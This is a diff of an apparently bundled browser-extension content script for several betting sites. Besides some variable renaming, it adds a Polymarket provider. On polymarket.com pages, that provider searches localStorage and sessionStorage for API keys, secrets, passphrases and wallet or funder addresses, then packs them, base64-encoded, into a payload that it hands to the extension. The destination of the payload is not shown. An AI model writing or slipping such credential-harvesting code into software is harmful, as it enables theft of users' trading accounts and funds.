@@ -457,7 +457,7 @@
   }
   var toJSONObject = (obj) => {
     const visited = /* @__PURE__ */ new WeakSet();
-    const visit = (source) => {
+    const visit2 = (source) => {
       if (isObject(source)) {
         if (visited.has(source)) {
           return;
@@ -469,7 +469,7 @@
           visited.add(source);
           const target = isArray(source) ? [] : {};
           forEach(source, (value, key) => {
-            const reducedValue = visit(value);
+            const reducedValue = visit2(value);
             !isUndefined(reducedValue) && (target[key] = reducedValue);
           });
           visited.delete(source);
@@ -478,7 +478,7 @@
       }
       return source;
     };
-    return visit(obj);
+    return visit2(obj);
   };
   var isAsyncFn = kindOfTest("AsyncFunction");
   var isThenable = (thing) => thing && (isObject(thing) || isFunction(thing)) && isFunction(thing.then) && isFunction(thing.catch);
@@ -907,7 +907,7 @@
   function redactConfig(config, redactKeys) {
     const lowerKeys = new Set(redactKeys.map((k) => String(k).toLowerCase()));
     const seen = [];
-    const visit = (source) => {
+    const visit2 = (source) => {
       if (source === null || typeof source !== "object") return source;
       if (utils_default.isBuffer(source)) return source;
       if (seen.indexOf(source) !== -1) return void 0;
@@ -919,7 +919,7 @@
       if (utils_default.isArray(source)) {
         result = [];
         source.forEach((v, i) => {
-          const reducedValue = visit(v);
+          const reducedValue = visit2(v);
           if (!utils_default.isUndefined(reducedValue)) {
             result[i] = reducedValue;
           }
@@ -931,7 +931,7 @@
         }
         result = /* @__PURE__ */ Object.create(null);
         for (const [key, value] of Object.entries(source)) {
-          const reducedValue = lowerKeys.has(key.toLowerCase()) ? REDACTED : visit(value);
+          const reducedValue = lowerKeys.has(key.toLowerCase()) ? REDACTED : visit2(value);
           if (!utils_default.isUndefined(reducedValue)) {
             result[key] = reducedValue;
           }
@@ -940,7 +940,7 @@
       seen.pop();
       return result;
     };
-    return visit(config);
+    return visit2(config);
   }
   var AxiosError = class _AxiosError extends Error {
     static from(error, code, config, request, response, customProps) {
@@ -2303,7 +2303,7 @@
   };
   var factory = (env) => {
     const globalObject = utils_default.global !== void 0 && utils_default.global !== null ? utils_default.global : globalThis;
-    const { ReadableStream: ReadableStream2, TextEncoder } = globalObject;
+    const { ReadableStream: ReadableStream2, TextEncoder: TextEncoder2 } = globalObject;
     env = utils_default.merge.call(
       {
         skipUndefined: true
@@ -2322,7 +2322,7 @@
       return false;
     }
     const isReadableStreamSupported = isFetchSupported && isFunction2(ReadableStream2);
-    const encodeText = isFetchSupported && (typeof TextEncoder === "function" ? /* @__PURE__ */ ((encoder) => (str) => encoder.encode(str))(new TextEncoder()) : async (str) => new Uint8Array(await new Request(str).arrayBuffer()));
+    const encodeText = isFetchSupported && (typeof TextEncoder2 === "function" ? /* @__PURE__ */ ((encoder) => (str) => encoder.encode(str))(new TextEncoder2()) : async (str) => new Uint8Array(await new Request(str).arrayBuffer()));
     const supportsRequestStream = isRequestSupported && isReadableStreamSupported && test(() => {
       let duplexAccessed = false;
       const request = new Request(platform_default.origin, {
@@ -2571,7 +2571,7 @@
             } else if (typeof responseData.size === "number") {
               materializedSize = responseData.size;
             } else if (typeof responseData === "string") {
-              materializedSize = typeof TextEncoder === "function" ? new TextEncoder().encode(responseData).byteLength : responseData.length;
+              materializedSize = typeof TextEncoder2 === "function" ? new TextEncoder2().encode(responseData).byteLength : responseData.length;
             }
           }
           if (typeof materializedSize === "number" && materializedSize > maxContentLength) {
@@ -3385,9 +3385,139 @@
     HGA: "HGA",
     HG: "HG",
     Stake: "Stake",
-    Dex: "Dex"
+    Dex: "Dex",
+    Polymarket: "Polymarket"
   });
   var PLATFORM_LIST = Object.values(PLATFORMS);
+
+  // src/content/polymarket/init.js
+  var CLOB_API = "https://clob.polymarket.com";
+  var GAMMA_API = "https://gamma-api.polymarket.com";
+  function getPolymarketCredentials() {
+    const captured = collectStorageCredentials();
+    const { polyHeaders, apiCreds, account, storage } = captured;
+    const walletAddress = polyHeaders.POLY_ADDRESS || polyHeaders.poly_address || account.address || account.walletAddress || "";
+    const funder = account.funder || account.funderAddress || account.proxyWallet || account.proxyWalletAddress || "";
+    const signatureType = account.signatureType || inferSignatureType(walletAddress, funder);
+    const token = JSON.stringify({
+      walletAddress,
+      funder,
+      signatureType,
+      apiCreds,
+      polyHeaders
+    });
+    const payload = {
+      provider: PLATFORMS.Polymarket,
+      gateway: CLOB_API,
+      gammaApi: GAMMA_API,
+      referer: location.href,
+      token,
+      walletAddress,
+      funder,
+      signatureType,
+      apiCreds,
+      polyHeaders,
+      account,
+      storage,
+      capturedAt: (/* @__PURE__ */ new Date()).toISOString()
+    };
+    return {
+      ...payload,
+      data: base64Utf8(JSON.stringify(payload))
+    };
+  }
+  function base64Utf8(text) {
+    const bytes = new TextEncoder().encode(text);
+    let binary = "";
+    for (const byte of bytes) binary += String.fromCharCode(byte);
+    return btoa(binary);
+  }
+  function inferSignatureType(walletAddress, funder) {
+    if (walletAddress && funder && walletAddress.toLowerCase() !== funder.toLowerCase())
+      return "1";
+    return "";
+  }
+  var STORAGE_KEY_RE = /(poly|polymarket|privy|dynamic|wallet|clob|api.?key|passphrase|funder|address)/i;
+  function collectStorageCredentials() {
+    const polyHeaders = {};
+    const apiCreds = {};
+    const account = {};
+    const storage = {};
+    readStorage("localStorage", localStorage, storage, apiCreds, account, polyHeaders);
+    readStorage("sessionStorage", sessionStorage, storage, apiCreds, account, polyHeaders);
+    return { polyHeaders, apiCreds, account, storage };
+  }
+  function readStorage(label, store, storage, apiCreds, account, polyHeaders) {
+    try {
+      const bucket = {};
+      for (let i = 0; i < store.length; i += 1) {
+        const key = store.key(i);
+        if (!key || !STORAGE_KEY_RE.test(key)) continue;
+        const value = store.getItem(key);
+        bucket[key] = typeof value === "string" && value.length > 2e3 ? value.slice(0, 2e3) : value;
+        capturePayload(value, apiCreds, account, polyHeaders);
+        captureKeyValue(key, value, apiCreds, account, polyHeaders);
+      }
+      if (Object.keys(bucket).length) storage[label] = bucket;
+    } catch {
+    }
+  }
+  function captureKeyValue(key, value, apiCreds, account, polyHeaders) {
+    const lower = String(key).toLowerCase();
+    if (value == null || typeof value === "object") return;
+    const text = String(value);
+    if (lower.includes("poly_address")) polyHeaders.POLY_ADDRESS = text;
+    if (lower.includes("poly_api_key")) polyHeaders.POLY_API_KEY = text;
+    if (lower.includes("poly_passphrase")) polyHeaders.POLY_PASSPHRASE = text;
+    if (lower.includes("apikey") || lower.includes("api_key")) apiCreds.apiKey ||= text;
+    if (lower.includes("secret")) apiCreds.secret ||= text;
+    if (lower.includes("passphrase")) apiCreds.passphrase ||= text;
+    if (lower.includes("wallet") || lower.includes("address")) account.address ||= text;
+    if (lower.includes("funder")) account.funder ||= text;
+  }
+  function capturePayload(raw, apiCreds, account, polyHeaders) {
+    const data = maybeJson(raw);
+    if (!data) return;
+    visit(data, (key, value) => {
+      if (value == null || typeof value === "object") return;
+      const lower = String(key).toLowerCase();
+      const text = String(value);
+      if (lower === "poly_address") polyHeaders.POLY_ADDRESS = text;
+      if (lower === "poly_api_key") polyHeaders.POLY_API_KEY = text;
+      if (lower === "poly_passphrase") polyHeaders.POLY_PASSPHRASE = text;
+      if (lower === "apikey" || lower === "api_key" || lower === "key") apiCreds.apiKey ||= text;
+      if (lower === "secret" || lower === "api_secret") apiCreds.secret ||= text;
+      if (lower === "passphrase" || lower === "api_passphrase") apiCreds.passphrase ||= text;
+      if (lower === "address" || lower === "walletaddress" || lower === "maker") account.address ||= text;
+      if (lower === "signaturetype" || lower === "signature_type") account.signatureType ||= text;
+      if (lower === "funder" || lower === "funderaddress" || lower === "proxywallet" || lower === "proxywalletaddress")
+        account.funder ||= text;
+    }, 0);
+  }
+  function maybeJson(raw) {
+    if (!raw) return void 0;
+    if (typeof raw === "object") return raw;
+    if (typeof raw !== "string") return void 0;
+    const text = raw.trim();
+    if (!text || text[0] !== "{" && text[0] !== "[") return void 0;
+    try {
+      return JSON.parse(text);
+    } catch {
+      return void 0;
+    }
+  }
+  function visit(value, fn, depth) {
+    if (!value || typeof value !== "object" || depth > 5) return;
+    if (Array.isArray(value)) {
+      value.slice(0, 50).forEach((row) => visit(row, fn, depth + 1));
+      return;
+    }
+    Object.keys(value).forEach((key) => {
+      const child = value[key];
+      fn(key, child);
+      visit(child, fn, depth + 1);
+    });
+  }
 
   // src/content/providers.js
   var IM_PATH = /^\/(esportsitev2|esportmobilev2)\/index.html\?v=\d+&id=\d+&token=([^\&]+)/;
@@ -3755,6 +3885,15 @@
           referer: location.href
         };
         return { ...payload, data: btoa(JSON.stringify(payload)) };
+      }
+    },
+    [PLATFORMS.Polymarket]: class PolymarketProvider {
+      async Check() {
+        return location.hostname === "polymarket.com" || location.hostname.endsWith(".polymarket.com");
+      }
+      async GetConfig() {
+        const credentials = getPolymarketCredentials();
+        return credentials?.token ? credentials : void 0;
       }
     }
   };
@@ -4149,7 +4288,8 @@
     chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
       const tabId = message?.options?.tabId;
       if (!tabId) return false;
-      const handler = tabHandlers[PLATFORMS.Stake] || tabHandlers[PLATFORMS.Dex];
+      const platform = message?.options?.platform || message?.options?.provider || message?.platform;
+      const handler = platform && tabHandlers[platform] || tabHandlers[PLATFORMS.Stake] || tabHandlers[PLATFORMS.Dex];
       if (!handler) return false;
       void (async () => {
         try {
